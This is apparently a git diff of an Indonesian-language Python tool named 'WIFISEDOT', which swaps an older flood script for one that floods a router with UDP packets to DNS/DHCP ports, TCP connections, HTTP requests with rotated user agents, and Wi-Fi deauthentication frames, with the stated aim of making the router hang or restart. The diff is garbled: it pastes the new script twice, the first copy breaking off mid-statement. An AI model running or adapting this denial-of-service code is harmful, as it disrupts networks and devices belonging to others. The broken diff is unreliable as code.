@@ -118,65 +118,196 @@ def udp_attack():
         try:
             data = random._urandom(1024)  # 1KB random data
             sock.sendto(data, (target, port))
-            with lock:
-                counter_udp += 1
-                print(f"{C}[UDP] #{counter_udp} sent to {target}:{port}{W}")
-        except Exception as e:
-            with lock:
-                counter_udp += 1
-                print(f"{R}[UDP] Error: {str(e)[:25]}{W}")
-        time.sleep(random.uniform(0.001, 0.01))
+            with lock:#!/usr/bin/env python3
+import requests
+import threading
+import random
+import time
+import socket
+import os
+import sys
+from scapy.all import *
+from scapy.layers.dot11 import Dot11, Dot11Deauth
+from scapy.layers.l2 import ARP, Ether
 
-# ========== ICMP (PING FLOOD) ==========
-def icmp_attack():
-    global counter_icmp
+G = '\033[92m'
+R = '\033[91m'
+Y = '\033[93m'
+C = '\033[96m'
+W = '\033[0m'
+
+os.system('clear')
+
+print(f"""{C}
+╔═══════════════════════════════════════════╗
+║    💀 WIFISEDOT - MODE NGELEK 💀          ║
+║    Created by : @Barxzzz                  ║
+║    Efek      : Router hang / restart      ║
+╚═══════════════════════════════════════════╝{W}
+""")
+
+target_ip = input(f"{G}[?] IP Router (contoh: 192.168.1.1): {W}")
+target_mac = input(f"{G}[?] MAC Router (opsional, ketik 'auto' buat scan): {W}")
+port = int(input(f"{G}[?] Port (80/443/53/67): {W}") or 80)
+threads = int(input(f"{G}[?] Jumlah thread (100-1000): {W}") or 300)
+durasi = int(input(f"{G}[?] Durasi (detik, 0 = forever): {W}") or 0)
+
+stop = False
+counter = 0
+lock = threading.Lock()
+
+# ========== UDP FLOOD (DNS & DHCP) ==========
+def udp_flood():
+    global counter
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    ports = [53, 67, 68, 123, 161, 443]
     while not stop:
         try:
-            # Kirim ping (ICMP) via subprocess
-            os.system(f"ping -c 1 {target} > /dev/null 2>&1")
+            target_port = random.choice(ports)
+            data = random._urandom(2048)
+            sock.sendto(data, (target_ip, target_port))
             with lock:
-                counter_icmp += 1
-                print(f"{Y}[ICMP] #{counter_icmp} ping sent{W}")
+                counter += 1
+                print(f"{C}[UDP] #{counter} -> {target_ip}:{target_port}{W}")
+#!/usr/bin/env python3
+import requests
+import threading
+import random
+import time
+import socket
+import os
+import sys
+from scapy.all import *
+from scapy.layers.dot11 import Dot11, Dot11Deauth
+from scapy.layers.l2 import ARP, Ether
+
+G = '\033[92m'
+R = '\033[91m'
+Y = '\033[93m'
+C = '\033[96m'
+W = '\033[0m'
+
+os.system('clear')
+
+print(f"""{C}
+╔═══════════════════════════════════════════╗
+║    💀 WIFISEDOT - MODE NGELEK 💀          ║
+║    Created by : @Barxzzz                  ║
+║    Efek      : Router hang / restart      ║
+╚═══════════════════════════════════════════╝{W}
+""")
+
+target_ip = input(f"{G}[?] IP Router (contoh: 192.168.1.1): {W}")
+target_mac = input(f"{G}[?] MAC Router (opsional, ketik 'auto' buat scan): {W}")
+port = int(input(f"{G}[?] Port (80/443/53/67): {W}") or 80)
+threads = int(input(f"{G}[?] Jumlah thread (100-1000): {W}") or 300)
+durasi = int(input(f"{G}[?] Durasi (detik, 0 = forever): {W}") or 0)
+
+stop = False
+counter = 0
+lock = threading.Lock()
+
+# ========== UDP FLOOD (DNS & DHCP) ==========
+def udp_flood():
+    global counter
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    ports = [53, 67, 68, 123, 161, 443]
+    while not stop:
+        try:
+            target_port = random.choice(ports)
+            data = random._urandom(2048)
+            sock.sendto(data, (target_ip, target_port))
+            with lock:
+                counter += 1
+                print(f"{C}[UDP] #{counter} -> {target_ip}:{target_port}{W}")
         except:
             pass
+        time.sleep(0.001)
+
+# ========== SYN FLOOD ==========
+def syn_flood():
+    global counter
+    while not stop:
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(0.5)
+            sock.connect((target_ip, port))
+            sock.send(b"GET / HTTP/1.1\r\n\r\n")
+            sock.close()
+            with lock:
+                counter += 1
+                print(f"{G}[SYN] #{counter} connected{W}")
+        except:
+            with lock:
+                counter += 1
+                print(f"{Y}[SYN] #{counter} failed{W}")
+        time.sleep(0.001)
+
+# ========== DEAUTH (butuh monitor mode) ==========
+def deauth_attack():
+    if target_mac == "auto":
+        print(f"{Y}[!] Auto scan MAC not implemented — skip deauth{W}")
+        return
+    while not stop:
+        try:
+            pkt = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_mac, addr3=target_mac)/Dot11Deauth(reason=7)
+            sendp(pkt, iface="wlan0mon", count=100, inter=0.01, verbose=0)
+            with lock:
+                counter += 100
+                print(f"{R}[DEAUTH] 100 paket dikirim{W}")
+        except:
+            pass
+        time.sleep(0.5)
+
+# ========== HTTP FLOOD ==========
+def http_flood():
+    global counter
+    uas = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0)",
+        "Mozilla/5.0 (Linux; Android 13)"
+    ]
+    paths = ["/", "/cgi-bin/", "/admin/", "/status", "/api/v1"]
+    while not stop:
+        try:
+            url = f"http://{target_ip}:{port}{random.choice(paths)}"
+            r = requests.get(url, headers={"User-Agent": random.choice(uas)}, timeout=2)
+            with lock:
+                counter += 1
+                print(f"{G}[HTTP] #{counter} OK{W}")
+        except:
+            with lock:
+                counter += 1
+                print(f"{Y}[HTTP] #{counter} failed{W}")
         time.sleep(0.01)
 
-# ========== MAIN ==========
-print(f"\n{G}[+] Target: {target}:{port}{W}")
-print(f"{G}[+] Threads: {threads}{W}")
-print(f"{G}[+] Durasi: {durasi} detik{W}")
-print(f"{G}[+] Mode: {mode.upper()}{W}")
-print(f"{G}[+] Proxy aktif: {len(proxy_list)} proxy{W}\n")
-print(f"{G}[+] Tekan CTRL+C untuk stop{W}\n")
+print(f"\n{G}[+] Menyerang {target_ip} dengan {threads} thread{W}")
+print(f"{G}[+] Durasi: {'Forever' if durasi == 0 else str(durasi) + ' detik'}{W}")
+print(f"{G}[+] Router akan ngelek dalam hitungan detik{W}\n")
 
-# Jalankan thread sesuai mode
-if mode in ["http", "all"]:
-    for _ in range(threads // 3 if mode == "all" else threads):
-        t = threading.Thread(target=http_attack)
-        t.daemon = True
-        t.start()
+# Jalankan semua serangan
+attackers = [
+    udp_flood, syn_flood, http_flood
+]
+if target_mac != "auto" and target_mac:
+    attackers.append(deauth_attack)
 
-if mode in ["udp", "all"]:
-    for _ in range(threads // 3 if mode == "all" else threads):
-        t = threading.Thread(target=udp_attack)
-        t.daemon = True
-        t.start()
-
-if mode in ["icmp", "all"]:
-    for _ in range(threads // 3 if mode == "all" else threads):
-        t = threading.Thread(target=icmp_attack)
+for _ in range(threads // len(attackers)):
+    for attack in attackers:
+        t = threading.Thread(target=attack)
         t.daemon = True
         t.start()
 
 # Timer
-time.sleep(durasi)
-stop = True
+if durasi > 0:
+    time.sleep(durasi)
+    stop = True
+else:
+    input(f"\n{Y}[!] Tekan ENTER untuk stop serangan{W}")
+    stop = True
 
-# Report
-print(f"\n{G}═══════════════════════════════════════════════════════{W}")
-print(f"{G}[✓] SERANGAN SELESAI{W}")
-print(f"{G}[✓] HTTP  : {counter_http} request{W}")
-print(f"{G}[✓] UDP   : {counter_udp} paket{W}")
-print(f"{G}[✓] ICMP  : {counter_icmp} ping{W}")
-print(f"{G}[✓] TOTAL : {counter_http + counter_udp + counter_icmp} paket{W}")
-print(f"{G}═══════════════════════════════════════════════════════{W}")
+print(f"\n{G}═══════════════════════════════════════════{W}")
+print(f"{G}[✓] SERANGAN DIHENTIKAN{W}")
+print(f"{G}[✓] Total paket: {counter}{W}")
+print(f"{R}[✓] Router target kemungkinan sudah restart{W}")
+print(f"{G}═══════════════════════════════════════════{W}")
